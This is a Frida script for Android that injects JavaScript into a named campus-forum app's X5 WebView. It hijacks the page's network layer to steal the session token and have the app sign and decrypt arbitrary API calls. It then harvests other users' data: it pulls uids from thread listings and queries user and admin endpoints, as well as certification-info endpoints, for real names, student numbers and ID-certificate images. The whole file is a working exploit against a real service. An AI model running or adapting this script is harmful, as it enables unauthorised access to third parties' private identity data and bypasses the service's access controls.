// h5probe.js — 在 App 的 X5(com.tencent.smtt.sdk.WebView) 里注入脚本，
// 借 H5 自己的 HB.Network 通道发任意请求（原生自动签名/解密），结果回传 frida。

var PAGE = "(" + function () {
    if (window.__pr) return 'have';
    var P = window.__pr = { out: [], hdr: null, started: false, err: null };
    function rand(n) { var s = ''; for (var i = 0; i < n; i++) s += Math.floor(Math.random() * 10); return s; }
    var orig = HB.Network.request;

    HB.Network.request = function (o) {
        try {
            if (!P.hdr && o && o.header && o.header['X-Sc-Token']) {
                P.hdr = o.header;
                P.alias = o.header['X-Sc-Alias'];
                if (!P.started) { P.started = true; setTimeout(run, 800); }
            }
        } catch (e) { }
        return orig.apply(this, arguments);
    };

    function call(path, data, method) {
        return new Promise(function (res) {
            if (!P.hdr) { res({ __nohdr: 1 }); return; }
            var h = {}, k;
            for (k in P.hdr) h[k] = P.hdr[k];
            h['X-Sc-Nd'] = rand(20);
            h['X-Sc-Td'] = String(Math.floor(Date.now() / 1000));
            var done = false;
            var timer = setTimeout(function () { if (!done) { done = true; res({ __timeout: 1 }); } }, 20000);
            var o = {
                url: 'http://api.app.zanao.com' + path,
                method: method || 'post',
                header: h,
                data: data || {},
                content_type: 'application/json; charset=utf-8',
                success: function (r) {
                    if (done) return; done = true; clearTimeout(timer);
                    if (r && r.__encrypt__ && r.__data__) {
                        try { r = JSON.parse(HB.Network.decryptSync({ data: r.__data__ })); } catch (e) { }
                    }
                    res(r);
                },
                fail: function (e) { if (done) return; done = true; clearTimeout(timer); res({ __fail: e }); },
                complete: function () { }
            };
            try { orig.call(HB.Network, o); } catch (e) { done = true; clearTimeout(timer); res({ __exc: '' + e }); }
        });
    }

    function collect(o, out) {
        out = out || {};
        if (Array.isArray(o)) { for (var i = 0; i < Math.min(o.length, 3); i++) collect(o[i], out); }
        else if (o && typeof o === 'object') {
            for (var k in o) {
                if (['uid', 'user_id', 'nickname', 'headimgurl', 'realname', 'student_no',
                    'cert_img', 'cert_img_url', 'cert_valid', 'errno', 'errmsg'].indexOf(k) >= 0
                    && typeof o[k] !== 'object') out[k] = o[k];
                collect(o[k], out);
            }
        }
        return out;
    }

    async function run() {
        try {
            P.out.push({ step: 'header', alias: P.alias, token: (P.hdr || {})['X-Sc-Token'] });
            var r1 = await call('/sc-api/thread/v2/list', { page: '1', per_page: '10' });
            P.out.push({ step: 'thread/list', errno: r1 && r1.errno, errmsg: r1 && r1.errmsg,
                         fields: collect(r1), raw: JSON.stringify(r1).slice(0, 500) });

            var list = null;
            (function find(o) {
                if (list || !o || typeof o !== 'object') return;
                if (Array.isArray(o) && o.length && o[0] && (o[0].uid || o[0].nickname)) { list = o; return; }
                for (var k in o) find(o[k]);
            })(r1);
            if (!list) { P.out.push({ step: 'no-list' }); return; }

            var peers = [];
            for (var i = 0; i < list.length && peers.length < 5; i++) {
                var it = list[i];
                if (it.uid && !it.is_anon) peers.push({
                    uid: it.uid, nickname: it.nickname, headimgurl: it.headimgurl,
                    thread_id: it.thread_id || it.id
                });
            }
            P.out.push({ step: 'peers', peers: peers });
            if (!peers.length) return;
            var t = peers[0];

            var r2 = await call('/sc-api/mx/user/usershow', { uid: t.uid });
            P.out.push({ step: 'mx/user/usershow', uid: t.uid, errno: r2 && r2.errno, fields: collect(r2), raw: JSON.stringify(r2).slice(0, 700) });

            var r3 = await call('/sc-api/mx/admin/userinfo', { uid: t.uid });
            P.out.push({ step: 'mx/admin/userinfo', uid: t.uid, errno: r3 && r3.errno, fields: collect(r3), raw: JSON.stringify(r3).slice(0, 700) });

            var r4 = await call('/sc-api/thread/admin/userinfo', { uid: t.uid });
            P.out.push({ step: 'thread/admin/userinfo', uid: t.uid, errno: r4 && r4.errno, fields: collect(r4), raw: JSON.stringify(r4).slice(0, 700) });

            if (t.thread_id) {
                var r5 = await call('/sc-api/user/usershow', { thread_id: t.thread_id });
                P.out.push({ step: 'user/usershow', thread_id: t.thread_id, errno: r5 && r5.errno, fields: collect(r5), raw: JSON.stringify(r5).slice(0, 700) });
            }

            var r6 = await call('/sc-api/user/certinfo', { school_id: '1', uid: t.uid }, 'get');
            P.out.push({ step: 'user/certinfo+uid', errno: r6 && r6.errno, fields: collect(r6), raw: JSON.stringify(r6).slice(0, 700) });
        } catch (e) {
            P.err = '' + e;
            P.out.push({ step: 'exception', err: P.err });
        }
    }
    return 'injected';
}.toString() + ")();";

var WV = null, printed = 0, injected = false;

function findWebView() {
    Java.perform(function () {
        var found = [];
        Java.choose('com.tencent.smtt.sdk.WebView', {
            onMatch: function (w) {
                try { found.push({ w: w, url: String(w.getUrl()) }); } catch (e) { }
            },
            onComplete: function () {
                if (!found.length) { send({ t: 'no-webview' }); return; }
                if (!WV) {
                    for (var i = 0; i < found.length; i++) {
                        if (found[i].url && found[i].url.indexOf('prod') >= 0) { WV = found[i].w; break; }
                    }
                    if (!WV) WV = found[found.length - 1].w;
                    send({ t: 'webview', urls: found.map(function (x) { return x.url; }) });
                }
            }
        });
    });
}

function evalJs(code, tag) {
    var VC = Java.use('com.tencent.smtt.sdk.ValueCallback');
    var Cb = Java.registerClass({
        name: 'com.z.PCb' + Math.floor(Math.random() * 1e7),
        implements: [VC],
        methods: {
            onReceiveValue: function (v) {
                if (tag === 'inject') send({ t: 'inject-ret', v: String(v).slice(0, 120) });
                else {
                    try {
                        var arr = JSON.parse(JSON.parse(String(v)));
                        if (arr.length > printed) {
                            for (var i = printed; i < arr.length; i++) send({ t: 'item', i: i, data: arr[i] });
                            printed = arr.length;
                        }
                    } catch (e) { send({ t: 'poll-err', raw: String(v).slice(0, 150) }); }
                }
            }
        }
    });
    var handler = Java.use('android.os.Handler').$new(Java.use('android.os.Looper').getMainLooper());
    var R = Java.registerClass({
        name: 'com.z.PR' + Math.floor(Math.random() * 1e7),
        implements: [Java.use('java.lang.Runnable')],
        methods: {
            run: function () {
                try {
                    WV.evaluateJavascript(code, VC.$cast(Cb.$new()));
                } catch (e) { send({ t: 'eval-err', m: '' + e }); }
            }
        }
    });
    handler.post(R.$new());
}

(function wait(t) {
    if (typeof Java !== 'undefined') {
        var n = 0;
        var iv = setInterval(function () {
            n++;
            if (WV && injected) { if (n > 3) clearInterval(iv); return; }
            if (n > 30) { clearInterval(iv); send({ t: 'giveup' }); return; }
            try { findWebView(); } catch (e) { send({ t: 'find-err', m: '' + e }); }
            if (WV && !injected) {
                injected = true;
                evalJs(PAGE, 'inject');
                setTimeout(function () {
                    setInterval(function () { evalJs('JSON.stringify(window.__pr?window.__pr.out:[])', 'poll'); }, 2500);
                }, 7000);
            }
        }, 3000);
        return;
    }
    if (t <= 0) { send({ t: 'nojava' }); return; }
    setTimeout(function () { wait(t - 1); }, 200);
})(200);
